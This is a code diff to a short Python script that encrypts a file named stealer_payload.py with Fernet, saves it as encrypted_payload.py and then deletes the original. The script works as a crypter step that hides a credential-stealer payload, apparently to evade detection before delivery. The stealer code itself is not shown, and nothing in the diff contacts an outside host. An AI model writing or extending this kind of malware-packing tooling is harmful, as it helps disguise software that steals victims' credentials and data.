@@ -1,19 +1,28 @@
 from cryptography.fernet import Fernet
+import os
 
-key = Fernet.generate_key()
-print(f"🔑 Your Key: {key.decode()}")
+# Load your existing key from key.txt
+with open("key.txt", "rb") as f:
+    key = f.read()
+print(f"🔑 Using key from key.txt: {key.decode()}")
 
-with open("key.txt", "wb") as f:
-    f.write(key)
-
-fernet = Fernet(key)
-
+# Read the raw payload file
 with open("stealer_payload.py", "rb") as f:
-    original = f.read()
+    data = f.read()
 
-encrypted = fernet.encrypt(original)
+# Encrypt the payload
+fernet = Fernet(key)
+encrypted = fernet.encrypt(data)
 
+# Save the encrypted payload
 with open("encrypted_payload.py", "wb") as f:
     f.write(encrypted)
 
-print("✅ Encrypted as encrypted_payload.py")
+print("✅ Encrypted payload saved to encrypted_payload.py")
+
+# Optional: delete the raw payload file
+try:
+    os.remove("stealer_payload.py")
+    print("🗑️ Deleted stealer_payload.py")
+except Exception as e:
+    print(f"⚠️ Could not delete stealer_payload.py: {e}")
